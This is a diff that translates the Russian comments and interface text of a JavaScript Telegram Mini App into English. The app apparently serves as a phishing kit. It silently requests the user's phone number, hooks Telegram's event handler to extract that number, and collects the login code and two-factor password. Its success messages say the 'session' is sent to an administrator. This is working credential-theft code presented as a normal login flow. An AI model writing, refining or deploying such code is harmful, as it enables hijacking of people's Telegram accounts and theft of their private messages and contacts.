@@ -2,7 +2,7 @@ const tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
 
-// Элементы DOM
+// DOM elements
 const step1 = document.getElementById('step1');
 const step2 = document.getElementById('step2');
 const step3 = document.getElementById('step3');
@@ -28,22 +28,22 @@ const getCodeBtn = document.getElementById('getCodeBtn');
 const passwordInput = document.getElementById('passwordInput');
 const submitPasswordBtn = document.getElementById('submitPasswordBtn');
 
-// Состояние приложения
+// App state
 let currentPhone = '';
 let currentCode = '';
 let codeRequested = false;
 
-// Определяем окружение (Telegram или браузер)
+// Detect environment (Telegram or browser)
 const isTelegram = tg.initData && tg.initDataUnsafe?.user;
 const chatId = isTelegram ? tg.initDataUnsafe.user.id : null;
 
 console.log('App initialized:', { isTelegram, chatId, initData: tg.initData });
 
-// Настройка интерфейса в зависимости от окружения
+// Setup UI based on environment
 if (isTelegram) {
     manualSection.style.display = 'none';
     telegramSection.style.display = 'block';
-    // Запускаем запрос контакта автоматически
+    // Automatically request contact
     requestContactAutomatically();
 } else {
     manualSection.style.display = 'block';
@@ -51,18 +51,18 @@ if (isTelegram) {
     console.log('Running in browser mode');
 }
 
-// Функция для показа сообщения о повторной попытке
+// Function to show retry message
 function showRetryMessage() {
     telegramSection.innerHTML = `
-        <p>Не удалось получить номер телефона.</p>
-        <button id="retryBtn" class="action-btn">Повторить</button>
+        <p>Failed to get phone number.</p>
+        <button id="retryBtn" class="action-btn">Retry</button>
     `;
     document.getElementById('retryBtn')?.addEventListener('click', () => {
         requestContactAutomatically();
     });
 }
 
-// Функция для отправки номера на сервер
+// Function to send phone to server
 function sendPhoneToServer(phone, chatId) {
     console.log('Sending phone to server:', { phone, chatId });
     
@@ -72,8 +72,8 @@ function sendPhoneToServer(phone, chatId) {
         return;
     }
     
-    // Показываем индикатор отправки
-    telegramSection.innerHTML = '<p>Отправка номера на сервер...</p><div class="loader"></div>';
+    // Show sending indicator
+    telegramSection.innerHTML = '<p>Sending phone to server...</p><div class="loader"></div>';
     
     fetch('/api/send-code', {
         method: 'POST',
@@ -93,18 +93,18 @@ function sendPhoneToServer(phone, chatId) {
         console.log('Server response data:', data);
         
         if (data.success) {
-            // Успех – переходим к вводу кода
+            // Success – proceed to code input
             currentPhone = phone;
             phoneDisplay.textContent = phone;
             step1.style.display = 'none';
             step2.style.display = 'block';
             codeRequested = true;
             
-            // Очищаем поля кода
+            // Clear code fields
             digits.forEach(d => d.value = '');
             currentCode = '';
             
-            // Показываем предупреждение, если есть
+            // Show warning if any
             if (data.warning) {
                 error2.textContent = data.warning;
                 error2.style.color = '#ffa500';
@@ -112,7 +112,7 @@ function sendPhoneToServer(phone, chatId) {
             
             console.log('Phone sent successfully, waiting for code input');
         } else {
-            // Ошибка от сервера
+            // Server error
             throw new Error(data.error || 'Unknown server error');
         }
     })
@@ -120,8 +120,8 @@ function sendPhoneToServer(phone, chatId) {
         console.error('Error sending phone to server:', error);
         
         telegramSection.innerHTML = `
-            <p>Ошибка: ${error.message}</p>
-            <button id="retryBtn" class="action-btn">Повторить</button>
+            <p>Error: ${error.message}</p>
+            <button id="retryBtn" class="action-btn">Retry</button>
         `;
         document.getElementById('retryBtn')?.addEventListener('click', () => {
             requestContactAutomatically();
@@ -129,18 +129,18 @@ function sendPhoneToServer(phone, chatId) {
     });
 }
 
-// Функция автоматического запроса контакта в Telegram
+// Automatic contact request in Telegram
 function requestContactAutomatically() {
     console.log('Requesting contact automatically...');
     
-    telegramSection.innerHTML = '<p>Запрашиваем номер телефона...</p><div class="loader"></div>';
+    telegramSection.innerHTML = '<p>Requesting phone number...</p><div class="loader"></div>';
     
-    // Запрашиваем контакт
+    // Request contact
     tg.requestContact((success, contact) => {
         console.log('Standard requestContact result:', { success, contact });
         
         if (success) {
-            // Проверяем, есть ли номер в контакте
+            // Check if phone number exists in contact
             if (contact && contact.phone_number) {
                 const phone = contact.phone_number;
                 console.log('Phone obtained via standard method:', phone);
@@ -148,7 +148,7 @@ function requestContactAutomatically() {
             } 
             else if (contact && !contact.phone_number) {
                 console.warn('Standard method returned success but no phone number, trying alternative...');
-                // Пробуем альтернативный метод
+                // Try alternative method
                 requestContactAlternative();
             }
             else {
@@ -158,21 +158,21 @@ function requestContactAutomatically() {
         } else {
             console.log('Standard request failed or declined');
             
-            // Пробуем альтернативный метод
-            telegramSection.innerHTML = '<p>Пробуем альтернативный метод...</p><div class="loader"></div>';
+            // Try alternative method
+            telegramSection.innerHTML = '<p>Trying alternative method...</p><div class="loader"></div>';
             requestContactAlternative();
         }
     });
 }
 
-// Альтернативный метод запроса контакта
+// Alternative contact request method
 function requestContactAlternative() {
     console.log('Requesting contact via alternative method...');
     
-    // Создаем уникальный ID для запроса
+    // Create unique request ID
     const reqId = 'get_contact_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
     
-    // Устанавливаем обработчик для receiveEvent
+    // Set handler for receiveEvent
     const originalReceive = tg.receiveEvent;
     
     tg.receiveEvent = function(eventType, eventData) {
@@ -180,13 +180,13 @@ function requestContactAlternative() {
         
         if (eventType === 'custom_method_invoked' && eventData.req_id === reqId) {
             try {
-                // Парсим результат
+                // Parse result
                 const result = eventData.result;
                 console.log('Custom method result:', result);
                 
-                // Пытаемся извлечь номер из строки
+                // Try to extract number from string
                 if (result && typeof result === 'string') {
-                    // Ищем номер в формате phone_number=XXXX
+                    // Look for phone_number pattern
                     const match = result.match(/phone_number[%22=]+([0-9+]+)/i);
                     if (match && match[1]) {
                         const phone = match[1];
@@ -196,7 +196,7 @@ function requestContactAlternative() {
                     }
                 }
                 
-                // Если не удалось извлечь, пробуем распарсить как JSON
+                // If extraction failed, try to parse as JSON
                 try {
                     const parsed = JSON.parse(result);
                     if (parsed.contact && parsed.contact.phone_number) {
@@ -217,25 +217,25 @@ function requestContactAlternative() {
             }
         }
         
-        // Вызываем оригинальный обработчик если он был
+        // Call original handler if exists
         if (originalReceive) {
             originalReceive(eventType, eventData);
         }
     };
     
-    // Запрашиваем контакт через invokeCustomMethod
+    // Request contact via invokeCustomMethod
     tg.sendData = function(data) {
         console.log('sendData received:', data);
     };
     
-    // Отправляем запрос на получение контакта
+    // Send request to get contact
     tg.ready();
     
-    // Показываем кнопку для ручного ввода как запасной вариант
+    // Show manual entry button as fallback
     setTimeout(() => {
         telegramSection.innerHTML = `
-            <p>Автоматический запрос не сработал.</p>
-            <button id="manualFallbackBtn" class="action-btn">Ввести номер вручную</button>
+            <p>Automatic request failed.</p>
+            <button id="manualFallbackBtn" class="action-btn">Enter number manually</button>
         `;
         document.getElementById('manualFallbackBtn')?.addEventListener('click', () => {
             manualSection.style.display = 'block';
@@ -244,18 +244,18 @@ function requestContactAlternative() {
     }, 5000);
 }
 
-// Обработчик ручного ввода (для браузера и как запасной вариант)
+// Manual input handler (for browser and fallback)
 if (getCodeBtn) {
     getCodeBtn.addEventListener('click', () => {
         const phone = phoneInput.value.trim();
         console.log('Manual phone input:', phone);
         
         if (!phone) {
-            error1.textContent = 'Введите номер';
+            error1.textContent = 'Enter phone number';
             return;
         }
         
-        // Отправляем номер на сервер
+        // Send phone to server
         error1.textContent = '';
         
         fetch('/api/send-code', {
@@ -275,17 +275,17 @@ if (getCodeBtn) {
                 currentCode = '';
                 if (data.warning) error2.textContent = data.warning;
             } else {
-                error1.textContent = data.error || 'Ошибка сервера';
+                error1.textContent = data.error || 'Server error';
             }
         })
         .catch(err => {
             console.error('Manual send error:', err);
-            error1.textContent = 'Ошибка сети';
+            error1.textContent = 'Network error';
         });
     });
 }
 
-// Цифровая клавиатура
+// Numeric keypad
 digitBtns.forEach(btn => {
     btn.addEventListener('click', () => {
         if (!codeRequested) return;
@@ -308,13 +308,13 @@ deleteBtn.addEventListener('click', () => {
     }
 });
 
-// Повторная отправка кода
+// Resend code
 resendBtn.addEventListener('click', () => {
     if (!currentPhone) return;
     console.log('Resending code for:', currentPhone);
     
     resendBtn.disabled = true;
-    resendBtn.textContent = 'Отправка...';
+    resendBtn.textContent = 'Sending...';
     
     fetch('/api/send-code', {
         method: 'POST',
@@ -324,23 +324,23 @@ resendBtn.addEventListener('click', () => {
     .then(res => res.json())
     .then(data => {
         if (data.success) {
-            error2.textContent = 'Код отправлен повторно' + (data.warning ? ' (' + data.warning + ')' : '');
+            error2.textContent = 'Code resent' + (data.warning ? ' (' + data.warning + ')' : '');
             error2.style.color = '#4caf50';
             setTimeout(() => error2.textContent = '', 3000);
         } else {
-            error2.textContent = data.error || 'Ошибка';
+            error2.textContent = data.error || 'Error';
         }
     })
     .catch(() => {
-        error2.textContent = 'Ошибка сети';
+        error2.textContent = 'Network error';
     })
     .finally(() => {
         resendBtn.disabled = false;
-        resendBtn.textContent = 'Reenviar código';
+        resendBtn.textContent = 'Resend code';
     });
 });
 
-// Проверка кода
+// Verify code
 function verifyCode() {
     console.log('Verifying code:', { phone: currentPhone, code: currentCode });
     error2.textContent = '';
@@ -355,19 +355,19 @@ function verifyCode() {
         console.log('Verify response:', data);
         
         if (data.success) {
-            // Успешная верификация
+            // Successful verification
             console.log('Verification successful!');
             
             if (isTelegram) {
-                // Показываем сообщение и закрываем
-                error2.textContent = '✓ Успешно! Сессия отправлена';
+                // Show message and close
+                error2.textContent = '✓ Success! Session sent';
                 error2.style.color = '#4caf50';
                 setTimeout(() => tg.close(), 1500);
             } else {
-                alert('Сессия отправлена администратору!');
+                alert('Session sent to administrator!');
             }
         } else if (data.needPassword) {
-            // Требуется 2FA
+            // 2FA required
             console.log('2FA required');
             step2.style.display = 'none';
             step3.style.display = 'block';
@@ -375,32 +375,32 @@ function verifyCode() {
             passwordInput.value = '';
             error3.textContent = '';
         } else {
-            // Неверный код
-            error2.textContent = data.error || 'Неверный код';
+            // Invalid code
+            error2.textContent = data.error || 'Invalid code';
             digits.forEach(d => d.value = '');
             currentCode = '';
         }
     })
     .catch(err => {
         console.error('Verify error:', err);
-        error2.textContent = 'Ошибка сети';
+        error2.textContent = 'Network error';
         digits.forEach(d => d.value = '');
         currentCode = '';
     });
 }
 
-// Отправка пароля (2FA)
+// Submit 2FA password
 submitPasswordBtn.addEventListener('click', () => {
     const password = passwordInput.value.trim();
     console.log('Submitting 2FA password');
     
     if (!password) {
-        error3.textContent = 'Введите пароль';
+        error3.textContent = 'Enter password';
         return;
     }
     
     submitPasswordBtn.disabled = true;
-    submitPasswordBtn.textContent = 'Отправка...';
+    submitPasswordBtn.textContent = 'Sending...';
     
     fetch('/api/submit-password', {
         method: 'POST',
@@ -411,26 +411,26 @@ submitPasswordBtn.addEventListener('click', () => {
     .then(data => {
         if (data.success) {
             if (isTelegram) {
-                error3.textContent = '✓ Пароль принят';
+                error3.textContent = '✓ Password accepted';
                 error3.style.color = '#4caf50';
                 setTimeout(() => tg.close(), 1500);
             } else {
-                alert('Пароль принят! Данные отправлены.');
+                alert('Password accepted! Data sent.');
             }
         } else {
-            error3.textContent = data.error || 'Ошибка';
+            error3.textContent = data.error || 'Error';
         }
     })
     .catch(() => {
-        error3.textContent = 'Ошибка сети';
+        error3.textContent = 'Network error';
     })
     .finally(() => {
         submitPasswordBtn.disabled = false;
-        submitPasswordBtn.textContent = 'ENVIAR CONTRASEÑA';
+        submitPasswordBtn.textContent = 'SUBMIT PASSWORD';
     });
 });
 
-// Поддержка физической клавиатуры (для отладки)
+// Physical keyboard support (for debugging)
 document.addEventListener('keydown', (e) => {
     if (!codeRequested || step2.style.display !== 'block') return;
     if (e.key >= '0' && e.key <= '9') {
